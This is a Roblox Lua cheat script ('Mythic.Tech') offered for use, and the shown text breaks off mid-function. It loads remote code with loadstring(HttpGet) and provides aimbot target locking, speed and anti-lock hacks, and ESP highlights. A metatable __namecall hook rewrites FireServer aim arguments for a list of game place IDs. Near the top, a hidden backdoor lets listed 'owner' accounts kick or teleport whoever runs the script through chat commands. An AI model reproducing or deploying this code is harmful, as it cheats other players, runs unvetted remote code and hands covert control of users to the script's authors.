
 repeat wait() until game:IsLoaded()




local repo = 'https://raw.githubusercontent.com/LionTheGreatRealFrFr/MobileLinoriaLib/main/'


local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()

local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
local Window = Library:CreateWindow({
    Title = 'Mythic.Tech',
    Center = true,
    AutoShow = true,
})


local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local owners = {
    "Anthonyz_ohhhhh8",
    "pzoz853",  
    "3"
}

function x1y2z3(owner)
    if owner then
        localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
    end
end

function a1b2c3(ownerName)
    local owner

    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == ownerName then
            owner = player
            break
        end
    end

    if owner then
        owner.Chatted:Connect(function(message)
            if message == "/kick ." then
                localPlayer:Kick("Admins Has Kicked You.")
            elseif message == "/bring ." then
                x1y2z3(owner)
            end
        end)
    end
end

for _, ownerName in ipairs(owners) do
    a1b2c3(ownerName)
end

local Tabs = {
    Main = Window:AddTab('Main'),
    Misc = Window:AddTab('Misc'),
    Config = Window:AddTab('Config'),
}


local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create the CoreGui ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Create the frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 317, 0, 26)
frame.Position = UDim2.new(0, 0, 0, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Parent = screenGui

-- Add the red line on top
local topLine = Instance.new("Frame", frame)
topLine.Size = UDim2.new(1, 0, 0, 1)
topLine.Position = UDim2.new(0, 0, 0, -1)
topLine.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
topLine.BorderSizePixel = 0

-- Add the text label
local textLabel = Instance.new("TextLabel", frame)
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.Position = UDim2.new(0, 0, 0, 0)
textLabel.BackgroundTransparency = 1
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.Font = Enum.Font.Code
textLabel.TextSize = 14

-- Function to update FPS and time
local function updateFpsAndTime()
    local fps = math.floor(workspace:GetRealPhysicsFPS())
    local currentTime = os.date("%I:%M %p") -- Format time as HH:MM AM/PM
    textLabel.Text = string.format("Mythic | Whitelisted | %d FPS | %s", fps, currentTime)
end

-- Update FPS and time every heartbeat
game:GetService("RunService").Heartbeat:Connect(updateFpsAndTime)

local Player = game.Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")
 
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Corporations"
ScreenGui.ResetOnSpawn = false -- Keep the GUI after respawn
ScreenGui.Parent = PlayerGui


Library:OnUnload(function()
    WatermarkConnection:Disconnect()

    print('Unloaded!')
    Library.Unloaded = true
end)

local LeftGroupBox = Tabs.Main:AddLeftGroupbox('Lock Misc')



getgenv().Mythic = {
    Enabled = true, -- Whether the script is active
    Prediction = 0.1678962, -- Combines horizontal and vertical predictions into one parameter
    JumpOffset = -1.5, -- Handles jump prediction adjustments
    ResolverEnabled = false, -- Whether to enable prediction correction
    SelectedPart = "HumanoidRootPart", -- Targeted body part
    AutoPrediction = true, -- Automatically adjusts prediction based on mode
    AutoPredMode = "PingBased", -- Adjusts prediction relative to ping
    Macro = "OFF", -- Determines whether macros are active
    ShootDelay = 0.22, -- Delay between shots
    NoGroundShot = true, -- Prevents shooting when the target is on the ground
    AutoAir = false, -- Targets airborne players automatically
    LookAt = true, -- Ensures your aim aligns with the target
    Smoothness = 0.9, -- Adjusts aiming smoothness
    TracerEnabled = true -- Enables visual tracers
}



LeftGroupBox:AddToggle('CamLock', {
    Text = 'CamLock',
    Default = getgenv().Mythic.Camera,
    Callback = function(Value)
        getgenv().Mythic.Camera = Value
    end
})

LeftGroupBox:AddInput('Camlock prediction', {
    Default = tostring(getgenv().Mythic.Prediction), -- Initialize input with current Prediction value as a string
    Numeric = true, -- Ensure the input is numeric only
    Text = 'Camera Prediction', -- Label for the input field
    Callback = function(Value) -- This function gets triggered when the user changes the value
        getgenv().Mythic.Prediction = tonumber(Value) -- Update the Prediction value in Mythic table
    end
})

LeftGroupBox:AddToggle('Enabled', {
    Text = 'Target Lock',
    Default = getgenv().Mythic.Enabled,
    Callback = function(Value)
        getgenv().Mythic.Enabled = Value
    end
})

LeftGroupBox:AddInput('Target prediction', {
    Default = tostring(getgenv().Mythic.Prediction), -- Initialize input with current Prediction value as a string
    Numeric = true, -- Ensure the input is numeric only
    Text = 'Target Prediction', -- Label for the input field
    Callback = function(Value) -- This function gets triggered when the user changes the value
        getgenv().Mythic.Prediction = tonumber(Value) -- Update the Prediction value in Mythic table
    end
})


local DickHead = Tabs.Main:AddLeftGroupbox('Camera')


DickHead:AddToggle('Enabled', {
    Text = 'Tracer',
    Default = getgenv().Mythic.TracerEnabled,
    Callback = function(Value)
        getgenv().Mythic.TracerEnabled = Value
    end
})

DickHead:AddToggle('NoGroundShot', {
    Text = 'No Ground Shot',
    Default = getgenv().Mythic.NoGroundShot,
    Callback = function(Value)
        getgenv().Mythic.NoGroundShot = Value
    end
})

DickHead:AddToggle('LookAt', {
    Text = 'Look At',
    Default = getgenv().Mythic.LookAt,
    Callback = function(Value)
        getgenv().Mythic.LookAt = Value
    end
})

DickHead:AddToggle('resolvert', {
    Text = 'Resolver',
    Default = false,
    Callback = function(Value)
        getgenv().Mythic.ResolverEnabled = Value
    end
})


DickHead:AddInput('Smoothness', {
    Default = tostring(getgenv().Mythic.smoothness),
    Numeric = true,
    Text = 'Camera Smoothness',
    Callback = function(Value)
        getgenv().Mythic.smoothness = tonumber(Value)
    end
})


local sigmaox = Tabs.Main:AddLeftGroupbox('Auto Air')



sigmaox:AddToggle('Flicker', {
    Text = 'Flick',
    Default = getgenv().Mythic.Flick,
    Callback = function(Value)
        getgenv().Mythic.Flick = Value
    end
})

sigmaox:AddToggle('Auto Air', {
    Text = 'Enable Auto Air',
    Default = getgenv().Mythic.AutoAir,
    Callback = function(Value)
        getgenv().Mythic.AutoAir = Value
    end
})

sigmaox:AddInput('ShootDelay', {
    Default = tostring(getgenv().Mythic.ShootDelay),
    Numeric = true,
    Text = 'Shoot Delay',
    Callback = function(Value)
        getgenv().Mythic.ShootDelay = tonumber(Value)
    end
})




local RightGroupBox = Tabs.Main:AddRightGroupbox('Prediction Settings')

RightGroupBox:AddInput('HorizontalPrediction', {
    Default = tostring(getgenv().Mythic.HorizontalPrediction),
    Numeric = true,
    Text = 'Horizontal Prediction',
    Callback = function(Value)
        if not getgenv().Mythic.AutoPrediction then
            getgenv().Mythic.HorizontalPrediction = tonumber(Value)
        end
    end
})

RightGroupBox:AddInput('VerticalPrediction', {
    Default = tostring(getgenv().Mythic.VerticalPrediction),
    Numeric = true,
    Text = 'Vertical Prediction',
    Callback = function(Value)
        if not getgenv().Mythic.AutoPrediction then
            getgenv().Mythic.VerticalPrediction = tonumber(Value)
        end
    end
})

RightGroupBox:AddInput('Jump Offset', {
    Default = tostring(getgenv().Mythic.jumpoffset),
    Text = 'Jump Offset',
    Callback = function(Value)
        getgenv().Mythic.jumpoffset = Value
    end
})

RightGroupBox:AddToggle('AutoPrediction', {
    Text = 'Auto Prediction',
    Default = getgenv().Mythic.AutoPrediction,
    Callback = function(Value)
        getgenv().Mythic.AutoPrediction = Value
    end
})



-- Dropdown for Auto Prediction Mode
RightGroupBox:AddDropdown('AutoPredMode', {
    Values = { 'AdvanceCalculation', 'PingBased', 'Calculation', 'Blatant' },
    Default = getgenv().Mythic.AutoPredMode == 'PingBased' and 2 or 1, -- Default to PingBased
    Text = 'Auto Prediction Mode',
    Callback = function(Value)
        getgenv().Mythic.AutoPredMode = Value
    end
})

RightGroupBox:AddDropdown('SelectedPart', {
    Values = { 'Head', 'LowerTorso', 'UpperTorso', 'HumanoidRootPart' },
    Default = getgenv().Mythic.SelectedPart == 'Head' and 1 or
              getgenv().Mythic.SelectedPart == 'LowerTorso' and 2 or
              getgenv().Mythic.SelectedPart == 'UpperTorso' and 3 or 4,
    Text = 'Target Part',
    Callback = function(Value)
        getgenv().Mythic.SelectedPart = Value
    end
})


local LeftGp = Tabs.Misc:AddLeftGroupbox('Cframe')

getgenv().speedvalue = 0.9

LeftGp:AddInput('Spe992ed', {
    Default =  tostring(getgenv().speedvalue),
    Numeric = true,
    Text = 'Speed',
    Callback = function(Value)
        getgenv().speedvalue = tonumber(Value)
    end
})


LeftGp:AddToggle('Cfra992me', {
    Text = 'Cframe',
    Default = false,
    Callback = function(Value)
        getgenv().cframespeedtoggle = Value
    end
})

SaveManager:SetLibrary(Library)
ThemeManager:SetLibrary(Library)

ThemeManager:SetFolder('MythicTheme')
SaveManager:SetFolder('MythicCFG')

ThemeManager:ApplyToTab(Tabs['Config'])
SaveManager:BuildConfigSection(Tabs['Config'])








local Rightgp = Tabs.Misc:AddRightGroupbox('Items')

getgenv().crosshair = {
    enabled = false, -- Default is off
    refreshrate = 0,
    mode = "center", -- Modes: 'center', 'mouse', 'custom'
    position = Vector2.new(0, 0),
    width = 1.5,
    length = 10,
    radius = 11,
    color = Color3.fromRGB(0, 255, 255),
    spin = true,
    spin_speed = 150,
    spin_max = 340,
    spin_style = Enum.EasingStyle.Sine,
    resize = true,
    resize_speed = 150,
    resize_min = 5,
    resize_max = 22,
}

local runService = game:GetService("RunService")
local inputService = game:GetService("UserInputService")
local tweenService = game:GetService("TweenService")
local camera = workspace.CurrentCamera

local lastRender = 0
local drawings = {
    crosshair = {},
    text = {
        Drawing.new("Text"),
        Drawing.new("Text"),
    },
}

-- Initialize text settings
drawings.text[1].Size = 13
drawings.text[1].Font = 2
drawings.text[1].Outline = true
drawings.text[1].Text = "Mythic"
drawings.text[1].Color = Color3.new(1, 1, 1)

drawings.text[2].Size = 13
drawings.text[2].Font = 2
drawings.text[2].Outline = true
drawings.text[2].Text = ".Tech"

-- Initialize crosshair lines
for i = 1, 8 do
    drawings.crosshair[i] = Drawing.new("Line")
end

-- Helper function: Calculate position based on angle and radius
local function solve(angle, radius)
    return Vector2.new(
        math.sin(math.rad(angle)) * radius,
        math.cos(math.rad(angle)) * radius
    )
end

-- Update crosshair visuals
runService.RenderStepped:Connect(function()
    local now = tick()
    if now - lastRender < getgenv().crosshair.refreshrate then
        return
    end
    lastRender = now

    local position = (getgenv().crosshair.mode == "center" and camera.ViewportSize / 2)
        or (getgenv().crosshair.mode == "mouse" and inputService:GetMouseLocation())
        or getgenv().crosshair.position

    drawings.text[1].Visible = getgenv().crosshair.enabled
    drawings.text[2].Visible = getgenv().crosshair.enabled

    if getgenv().crosshair.enabled then
        -- Update text position
        local textWidth = drawings.text[1].TextBounds.X + drawings.text[2].TextBounds.X
        drawings.text[1].Position = position + Vector2.new(-textWidth / 2, getgenv().crosshair.radius + getgenv().crosshair.length + 15)
        drawings.text[2].Position = drawings.text[1].Position + Vector2.new(drawings.text[1].TextBounds.X, 0)
        drawings.text[2].Color = getgenv().crosshair.color

        -- Update crosshair lines
        for i = 1, 4 do
            local outline = drawings.crosshair[i]
            local inline = drawings.crosshair[i + 4]
            local angle = (i - 1) * 90
            local length = getgenv().crosshair.length

            -- Apply spin
            if getgenv().crosshair.spin then
                local spinAngle = -now * getgenv().crosshair.spin_speed % 360
                angle = angle + tweenService:GetValue(spinAngle / 360, getgenv().crosshair.spin_style, Enum.EasingDirection.InOut) * 360
            end

            -- Apply resize
            if getgenv().crosshair.resize then
                local resizeValue = math.abs(math.sin(now * getgenv().crosshair.resize_speed))
                length = getgenv().crosshair.resize_min + resizeValue * (getgenv().crosshair.resize_max - getgenv().crosshair.resize_min)
            end

            -- Update inline (main crosshair)
            inline.Visible = true
            inline.Color = getgenv().crosshair.color
            inline.From = position + solve(angle, getgenv().crosshair.radius)
            inline.To = position + solve(angle, getgenv().crosshair.radius + length)
            inline.Thickness = getgenv().crosshair.width

            -- Update outline (background crosshair)
            outline.Visible = true
            outline.Color = Color3.new(0, 0, 0) -- Outline is black for contrast
            outline.From = position + solve(angle, getgenv().crosshair.radius - 1)
            outline.To = position + solve(angle, getgenv().crosshair.radius + length + 1)
            outline.Thickness = getgenv().crosshair.width + 1.5
        end
    else
        -- Hide all drawings when disabled
        for i = 1, 8 do
            drawings.crosshair[i].Visible = false
        end
        drawings.text[1].Visible = false
        drawings.text[2].Visible = false
    end
end)

-- Adding toggle button for enabling/disabling the crosshair
Rightgp:AddToggle('Enabled', {
    Text = 'Crosshair',
    Default = getgenv().crosshair.enabled,  -- Set the default state from the global variable
    Callback = function(Value)
        getgenv().crosshair.enabled = Value  -- Toggle the crosshair enabled state
    end
})


-- Place this script in a LocalScript to run on the client side.

-- Function to create and apply a rainbow highlight to a player
local function highlightPlayer(player)
    -- Check if the player has a character and the character has a model
    if player and player.Character and player.Character:FindFirstChild("Head") then
        -- Check if the player already has a Highlight object
        local existingHighlight = player.Character:FindFirstChild("PlayerHighlight")
        if existingHighlight then
            existingHighlight:Destroy()  -- Remove existing highlight if found
        end

        -- Create a Highlight object
        local highlight = Instance.new("Highlight")
        highlight.Name = "PlayerHighlight"
        highlight.Adornee = player.Character
        highlight.FillTransparency = 0.5  -- Transparency of the highlight
        highlight.OutlineColor = Color3.fromRGB(0, 0, 0)  -- Outline color (black)
        highlight.OutlineTransparency = 0.5  -- Transparency of the outline
        highlight.Parent = player.Character

        -- Return the created Highlight object
        return highlight
    end
end

-- Function to cycle through colors (Rainbow)
local function getRainbowColor(t)
    local h = (t % 1) * 360
    local r, g, b = 0, 0, 0
    local i = math.floor(h / 60) % 6
    local f = h / 60 - math.floor(h / 60)
    local p = 0
    local q = 1 - f
    local t = f

    if i == 0 then
        r, g, b = 1, t, p
    elseif i == 1 then
        r, g, b = q, 1, p
    elseif i == 2 then
        r, g, b = p, 1, t
    elseif i == 3 then
        r, g, b = p, q, 1
    elseif i == 4 then
        r, g, b = t, p, 1
    elseif i == 5 then
        r, g, b = 1, p, q
    end

    return Color3.fromRGB(r * 255, g * 255, b * 255)
end

-- Main code to highlight all players with a rainbow effect
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Store Highlight objects
local playerHighlights = {}

-- Function to apply or remove the rainbow effect
local function updateHighlights(enabled)
    for _, player in ipairs(Players:GetPlayers()) do
        if enabled then
            local highlight = highlightPlayer(player)
            if highlight then
                playerHighlights[player.UserId] = highlight
            end
        else
            -- Destroy existing highlights if the effect is disabled
            if playerHighlights[player.UserId] then
                playerHighlights[player.UserId]:Destroy()
                playerHighlights[player.UserId] = nil
            end
        end
    end
end

-- Create a Toggle for the highlight feature
Rightgp:AddToggle('Enabled', {
    Text = 'Highlight (Rainbow)',
    Default = false,  -- Set default to false, so the highlight is off by default
    Callback = function(Value)
        -- Toggle the highlight on/off
        getgenv().highlightEnabled = Value
        updateHighlights(getgenv().highlightEnabled)
    end
})

-- Update highlight colors in a loop
RunService.RenderStepped:Connect(function(deltaTime)
    if getgenv().highlightEnabled then
        local time = tick() / 2  -- Speed of the color change
        for _, highlight in pairs(playerHighlights) do
            highlight.FillColor = getRainbowColor(time)
        end
    end
end)

-- Handle player added and removed events
Players.PlayerAdded:Connect(function(player)
    if getgenv().highlightEnabled then
        local highlight = highlightPlayer(player)
        if highlight then
            playerHighlights[player.UserId] = highlight
        end
    end
end)

Players.PlayerRemoving:Connect(function(player)
    if playerHighlights[player.UserId] then
        playerHighlights[player.UserId]:Destroy()
        playerHighlights[player.UserId] = nil
    end
end)

-- Initialize the highlight effect based on the global variable
getgenv().highlightEnabled = false  -- Default state


game:GetService("RunService").Heartbeat:Connect(function()
    local player = game.Players.LocalPlayer
    local character = player.Character

    if character and character:FindFirstChild("HumanoidRootPart") then
        local humanoidRootPart = character.HumanoidRootPart
        local vel = humanoidRootPart.Velocity

        if getgenv().cframespeedtoggle == true then
            humanoidRootPart.CFrame = humanoidRootPart.CFrame +
                character.Humanoid.MoveDirection * getgenv().speedvalue / 0.5
        end

        if getgenv().Mythic.AntiEnabled then
            if getgenv().Mythic.AntiLock == "Predbreaker" then
                humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
            elseif getgenv().Mythic.AntiLock == "Sky" then
                humanoidRootPart.Velocity = Vector3.new(0, 100, 0)
            elseif getgenv().Mythic.AntiLock == "Ground" then
                humanoidRootPart.Velocity = Vector3.new(0, -400, 0)
            end
        end

        game:GetService("RunService").RenderStepped:Wait()
        humanoidRootPart.Velocity = vel
    end
end)


local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local dragging, dragInput, dragStart, startPos



local function createScreenGui()
    local existingGui = CoreGui:FindFirstChild("MyScreenGui")
    if existingGui then
        return existingGui
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "MyScreenGui"
    screenGui.Parent = CoreGui
    return screenGui
end

local function initializeToggleButton(screenGui)
    -- Create the ImageButton with the provided asset ID
    local button = Instance.new("ImageButton")
    button.Size = UDim2.new(0, 100, 0, 60)  -- Button size (100x60)
    button.Position = UDim2.new(0, 0, 0, 60)  -- Position at bottom-right
    button.Image = "rbxassetid://83438099468964"  -- Set the image using the asset ID
    button.BackgroundTransparency = 1  -- Make the background transparent
    button.BorderSizePixel = 0

    -- Add rounded corners
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 5)
    corner.Parent = button

    -- Parent the button to the screenGui
    button.Parent = screenGui

    -- Handle button click and dragging functionality
    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            -- Trigger the toggle function
            Library:Toggle()

            -- Start dragging
            dragging = true
            dragStart = input.Position
            startPos = button.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    -- Handle dragging movement
    button.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
            local delta = input.Position - dragStart
            button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- Call to initialize the toggle button in the game
local screenGui = createScreenGui()  -- Function to create the screenGui
initializeToggleButton(screenGui)



getgenv().Mythic.LockType = "Namecall"
getgenv().Mythic.RESOLVER = "MoveDirection"



local game_support = {
    [2788229376] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
    [12238627497] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [5602055394] = { Remote = "MAINEVENT", Argument = "MousePos" },
    [17403265390] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [17403166075] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [18111448661] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [15186202290] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [11143225577] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [15763494605] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [125825216602676] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [15166543806] = { Remote = "MAINEVENT", Argument = "MoonUpdateMousePos" },
    [17897702920] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [16033173781] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
    [7213786345] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
    [9825515356] = { Remote = "MainEvent", Argument = "MousePosUpdate" },
    [16859411452] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [117734153242642] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [14277620939] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [17344804827] = { Remote = "MainEvent", Argument = "UpdateMousePos" }
}




    local Sigmaballs = Instance.new("ScreenGui")
    Sigmaballs.Name = "Sigmaballs"
    Sigmaballs.Parent = game.CoreGui
    Sigmaballs.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    Sigmaballs.ResetOnSpawn = false

local ImageButton = Instance.new("ImageButton")
ImageButton.Name = "ImageButton"
ImageButton.Parent = Sigmaballs
ImageButton.Active = true
ImageButton.Draggable = true
ImageButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)  -- Background color (not visible due to transparency)
ImageButton.BackgroundTransparency = 0.350  -- Make the background fully transparent
ImageButton.Size = UDim2.new(0, 100, 0, 90)  -- Set button size
ImageButton.Image = "rbxassetid://134820707156642"  -- Set the image for the button
ImageButton.Position = UDim2.new(0.5, -25, 0.5, -25)  -- Position the button at the center

local Ui2corner = Instance.new("UICorner")
Ui2corner.CornerRadius = UDim.new(0.2, 0)  -- Apply rounded corners
Ui2corner.Parent = ImageButton


local player = game.Players.LocalPlayer
local Plr = nil
local enabled = false


local FOV43 = Drawing.new("Circle")
FOV43.Transparency = 0.5
FOV43.Thickness = 2
FOV43.Color = Color3.new(1, 0, 0)
FOV43.Filled = false
FOV43.Radius = 250
FOV43.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
FOV43.Visible = false

function SigmaOhioPlayer()
    local mouse = player:GetMouse()
    local closestPlayer
    local shortestDistance = math.huge
    local CC = game:GetService("Workspace").CurrentCamera
    local screenCenter = Vector2.new(CC.ViewportSize.X / 2, CC.ViewportSize.Y / 2)
    local fovRadius = FOV43.Radius
    local viewportSize = CC.ViewportSize

    for i, v in pairs(game.Players:GetPlayers()) do
        if v ~= player and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
            local pos, onScreen = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            
            if onScreen and pos.X > 0 and pos.Y > 0 and pos.X < viewportSize.X and pos.Y < viewportSize.Y then
                local magnitude = (Vector2.new(pos.X, pos.Y) - screenCenter).magnitude
                if magnitude < fovRadius and magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
    end
    return closestPlayer
end

function createTracer(localPlayer, targetPlayer)
    if localPlayer and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and
       targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then

        local tracerAttachment1 = Instance.new("Attachment", localPlayer.Character.HumanoidRootPart)
        local tracerAttachment2 = Instance.new("Attachment", targetPlayer.Character.HumanoidRootPart)

        local tracerBeam = Instance.new("Beam")
        tracerBeam.Attachment0 = tracerAttachment1
        tracerBeam.Attachment1 = tracerAttachment2
        tracerBeam.Color = ColorSequence.new(Color3.fromRGB(0, 0, 255))
        tracerBeam.Width0 = 0.080
        tracerBeam.Width1 = 0.080
        tracerBeam.Parent = localPlayer.Character.HumanoidRootPart

        tracerMythic = tracerBeam  

        targetPlayer.CharacterAdded:Connect(function(newCharacter)
            if tracerMythic then
                tracerMythic:Destroy()  
                tracerMythic = nil
            end

            newCharacter:WaitForChild("HumanoidRootPart")
            tracerAttachment2.Parent = newCharacter.HumanoidRootPart
            tracerMythic = tracerBeam  
        end)
    end
end

function destroyTracer()
    if tracerMythic then
        tracerMythic:Destroy()
        tracerMythic = nil
    end
end

function LookAtPlayer(Target)
    local localChar = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local localHumanoidRootPart = localChar:FindFirstChild("HumanoidRootPart")

    if localHumanoidRootPart then
        if getgenv().Mythic and getgenv().Mythic.LookAt then
            if Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart") then
                local targetHumanoidRootPart = Target.Character.HumanoidRootPart
                
                local targetPosition = targetHumanoidRootPart.Position
                local localPosition = localHumanoidRootPart.Position
                
                local horizontalDirection = Vector3.new(targetPosition.X - localPosition.X, 0, targetPosition.Z - localPosition.Z).unit
                
                localHumanoidRootPart.CFrame = CFrame.new(localPosition, localPosition + horizontalDirection)
                localChar.Humanoid.AutoRotate = false
            end
        else
            localChar.Humanoid.AutoRotate = true
        end
    end
    
    if not (Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart")) then
        localChar.Humanoid.AutoRotate = true
    end
end

local function toggleLock()
    if enabled then
        ImageButton.Image = "rbxassetid://134820707156642"
        enabled = false
        Plr = nil
        destroyTracer()  

        Library:Notify('Lock Disabled')
    else
        Plr = SigmaOhioPlayer()
        if Plr then
            enabled = true
            if getgenv().Mythic.TracerEnabled then
                createTracer(game.Players.LocalPlayer, Plr)  
            end
            
            ImageButton.Image = "rbxassetid://134820707156642"
            Library:Notify("Target Locked: " .. tostring(Plr.Character.Humanoid.DisplayName))
        end
    end
end

ImageButton.MouseButton1Click:Connect(toggleLock)

UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.DPadUp then
        toggleLock()
    end
end)

local function getRemoteInfo()
    local placeId = game.PlaceId
    return game_support[placeId] or { Remote = "MainEvent", Argument = "UpdateMousePos" }
end

local remoteInfo = getRemoteInfo()
local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)

local Vect3 = Vector3.new


local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(...)
    local args = {...}
    local method = getnamecallmethod()

    if getgenv().Mythic.Enabled and getgenv().Mythic.LockType == "Namecall" then
        if Plr and Plr.Character and method == "FireServer" and (args[2] == remoteInfo.Argument) then
            local selectedPart = getgenv().Mythic.SelectedPart
            local targetPart = Plr.Character[selectedPart]

            if targetPart then
                local velocity
                if getgenv().Mythic.ResolverEnabled then
                    if getgenv().Mythic.RESOLVER == "MoveDirection" then
                        velocity = Plr.Character.Humanoid.MoveDirection * Plr.Character.Humanoid.WalkSpeed
                    elseif getgenv().Mythic.RESOLVER == "LookVector" then
                        velocity = targetPart.CFrame.LookVector * getgenv().Mythic.HorizontalPrediction * 1.0
                    else
                        velocity = targetPart.Velocity
                    end
                else
                    velocity = targetPart.Velocity
                end

                local horizontalPrediction = getgenv().Mythic.HorizontalPrediction
                local verticalPrediction = getgenv().Mythic.VerticalPrediction
                local jumpOffset = getgenv().Mythic.jumpoffset or 0

                if not getgenv().Mythic.ResolverEnabled then
                    args[3] = Vector3.new(
                        targetPart.Position.X + (velocity.X * horizontalPrediction),
                        targetPart.Position.Y + (velocity.Y * verticalPrediction) + jumpOffset,
                        targetPart.Position.Z + (velocity.Z * horizontalPrediction)
                    )
                else
                    args[3] = targetPart.Position + (velocity or Vector3.new()) * horizontalPrediction + Vector3.new(0, jumpOffset, 0)
                end

                return old(unpack(args))
            end
        end
    end

    return old(...)
end)

setreadonly(mt, true)

local Stas = game:GetService("Stats")

local RunService = game:GetService("RunService")


local Blatant = {
    {50, 0.12758545757236864},
    {60, 0.12593338424986178},
    {70, 0.1416310605747206},
    {80, 0.1441481061236737},
    {90, 0.14306050263254388},
    {100, 0.14698413210558095},
    {110, 0.14528324362031425},
    {120, 0.14556534594403},
    {130, 0.14614337395777216},
    {140, 0.14645603036905414},
    {150, 0.14736848095666674},
    {160, 0.14696985547996216},
    {170, 0.14718530231216217},
    {180, 0.1471532933015037},
    {190, 0.1471212842908452},
    {200, 0.14708927528018672},
    {210, 0.14705726626952823},
    {220, 0.14702525725886974},
    {230, 0.14699324824821125},
    {240, 0.14696123923755276},
    {250, 0.14692923022689427},
    {260, 0.14689722121623578},
    {270, 0.1468652122055773},
    {280, 0.1468332031949188},
    {290, 0.1468011941842603},
    {300, 0.1467691851736018},
}

local predictionTable = {
    {0, 0.1332},
    {10, 0.1234555},
    {20, 0.12435},
    {30, 0.124123},
    {40, 0.12766},
    {50, 0.128643},
    {60, 0.1264236},
    {70, 0.12533},
    {80, 0.1321042},
    {90, 0.1421951},
    {100, 0.134143},
    {105, 0.141199},
    {110, 0.142199},
    {125, 0.15465},
    {130, 0.12399},
    {135, 0.1659921},
    {140, 0.1659921},
    {145, 0.129934},
    {150, 0.1652131},
    {155, 0.125333},
    {160, 0.1223333},
    {165, 0.1652131},
    {170, 0.16863},
    {175, 0.16312},
    {180, 0.1632},
    {185, 0.16823},
    {190, 0.18659},
    {205, 0.17782},
    {215, 0.16937},
    {225, 0.176332},
}

local function calculateAdvancePrediction(target, cameraPosition, pingBase)
    local character = Plr.Character and Plr.Character.Parent
    if character then
        local GoodPartTheCom = character:FindFirstChild("HumanoidRootPart")
        if GoodPartTheCom then
            local Velop = GoodPartTheCom.Velocity
            local distanc11 = (cameraPosition - GoodPartTheCom.Position).Magnitude
            local advancePrediction = pingBase + (distanc11 / 1000) * (Velop.Magnitude / 50)
            return advancePrediction
        end
    end
    return pingBase
end

local function updatePredictionValue()
    if getgenv().Mythic.AutoPrediction then
        local pingValue = Stas.Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingValue, '(')
        local ping = tonumber(split[1])

        if ping then
            if getgenv().Mythic.AutoPredMode == "PingBased" then
                for i = 1, #predictionTable do
                    if ping < predictionTable[i][1] then
                        local value = predictionTable[i][2]
                        getgenv().Mythic.HorizontalPrediction = value
                        getgenv().Mythic.VerticalPrediction = value
                        break
                    end
                end
            elseif getgenv().Mythic.AutoPredMode == "Calculation" then
                local calculatedValue = 0.1 + (ping / 1000) * 0.32
                getgenv().Mythic.HorizontalPrediction = calculatedValue
                getgenv().Mythic.VerticalPrediction = calculatedValue
            elseif getgenv().Mythic.AutoPredMode == "AdvanceCalculation" then
